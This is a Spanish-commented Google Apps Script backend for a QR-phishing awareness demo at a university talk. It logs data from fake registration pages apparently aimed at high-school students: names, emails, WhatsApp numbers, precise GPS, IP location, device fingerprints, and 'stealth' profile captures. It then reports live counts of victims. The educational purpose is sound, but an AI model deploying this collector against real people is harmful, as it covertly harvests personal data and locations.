/**
 * Google Apps Script — Actividad QR Phishing Demo
 * CIO for a Day · UVG · julio 2026
 *
 * INSTRUCCIONES DE DEPLOY:
 * 1. Abre Google Sheets → Extensions → Apps Script
 * 2. Pega este archivo como Code.gs
 * 3. Crea una hoja llamada "datos" en el Spreadsheet
 * 4. Deploy → New deployment → Web App
 *    - Execute as: Me
 *    - Who has access: Anyone
 * 5. Copia la URL del Web App
 * 6. Pega la URL en charla-cio/index.html (var STATS_URL)
 *    y en charla-cio/qr-bienvenida/index.html y qr-registro/index.html (var STATS_URL)
 *
 * IMPORTANTE: Borrar todos los datos del Sheet después de la charla.
 */

var SHEET_NAME = "datos";

var HEADERS = [
  "Timestamp", "Tipo", "SessionId",
  "Nombre", "Grado", "Colegio", "Correo", "WhatsApp",
  "Carreras de interés", "Motivación",
  "IP", "País", "Ciudad", "ISP", "Lat aprox", "Lng aprox",
  "Lat GPS", "Lng GPS", "Precisión GPS (m)",
  "User-Agent", "Plataforma", "Idioma", "Idiomas",
  "Pantalla", "Viewport", "DPR", "Color Depth",
  "Zona horaria", "TZ Offset (min)",
  "Red", "Downlink", "RTT",
  "Cores CPU", "RAM (GB)", "Touch points",
  "Batería", "Referrer", "Fingerprint", "URL"
];

/**
 * Recibe eventos desde las landing pages (safe_hit y registro_bachillerato).
 * Usa Content-Type: text/plain para evitar preflight CORS.
 */
function doPost(e) {
  try {
    var body = JSON.parse(e.postData.contents);
    var sheet = SpreadsheetApp.getActive().getSheetByName(SHEET_NAME);

    if (!sheet) {
      sheet = SpreadsheetApp.getActive().insertSheet(SHEET_NAME);
      sheet.appendRow(HEADERS);
    }

    sheet.appendRow([
      new Date(),
      body.type          || "",
      body.sessionId     || "",
      /* Datos del formulario */
      body.nombre        || "",
      body.grado         || body.carnet   || "",
      body.colegio       || body.carrera  || "",
      body.correo        || "",
      body.whatsapp      || "",
      body.carreras      || body.curso    || "",
      body.motivacion    || body.anio     || "",
      /* Datos de IP */
      body.ip            || "",
      body.pais          || "",
      body.ciudad        || "",
      body.isp           || "",
      body.latAprox      || "",
      body.lngAprox      || "",
      /* Geolocalización GPS precisa */
      body.lat           || "",
      body.lng           || "",
      body.accuracy      || "",
      /* Datos del navegador / dispositivo */
      body.userAgent     || "",
      body.platform      || "",
      body.language      || "",
      body.languages     || "",
      (body.screenW && body.screenH) ? body.screenW + "x" + body.screenH : "",
      (body.viewW   && body.viewH)   ? body.viewW   + "x" + body.viewH   : "",
      body.dpr           || "",
      body.colorDepth    || "",
      body.timezone      || "",
      body.tzOffset      !== undefined ? body.tzOffset : "",
      body.netType       || "",
      body.downlink      || "",
      body.rtt           || "",
      body.cores         || "",
      body.ram           || "",
      body.touch         !== undefined ? body.touch : "",
      body.battery       || "",
      body.referrer      || "",
      body.fingerprint   || "",
      body.url           || "",
    ]);

    return buildResponse({ ok: true });
  } catch (err) {
    return buildResponse({ ok: false, error: err.message });
  }
}

/**
 * Devuelve el conteo de hits por tipo.
 * Usado por la presentación para mostrar estadísticas en tiempo real.
 * - safeHits:        escaneos del QR benigno (qr-bienvenida)
 * - phishSubmits:    formulario falso enviado
 * - stealthCaptures: perfiles capturados silenciosamente al escanear el QR de registro
 * - geoGranted:      víctimas que aceptaron el prompt de geolocalización precisa
 */
function doGet(e) {
  try {
    var sheet = SpreadsheetApp.getActive().getSheetByName(SHEET_NAME);
    if (!sheet) return buildResponse({ safeHits: 0, phishSubmits: 0, stealthCaptures: 0, geoGranted: 0 });

    var data = sheet.getDataRange().getValues();

    var safeHits       = 0;
    var phishSubmits   = 0;
    var stealthCaptures = 0;
    var geoGranted     = 0;

    for (var i = 1; i < data.length; i++) {
      var tipo = data[i][1];
      if (tipo === "safe_hit")                              safeHits++;
      if (tipo === "phish_submit" ||
          tipo === "registro_bachillerato")                 phishSubmits++;
      if (tipo === "stealth_capture")                       stealthCaptures++;
      if (tipo === "stealth_geo")                           geoGranted++;
    }

    return buildResponse({
      safeHits:        safeHits,
      phishSubmits:    phishSubmits,
      stealthCaptures: stealthCaptures,
      geoGranted:      geoGranted,
    });
  } catch (err) {
    return buildResponse({ safeHits: 0, phishSubmits: 0, stealthCaptures: 0, geoGranted: 0, error: err.message });
  }
}

/** Helper: respuesta JSON con headers CORS */
function buildResponse(obj) {
  return ContentService
    .createTextOutput(JSON.stringify(obj))
    .setMimeType(ContentService.MimeType.JSON);
}
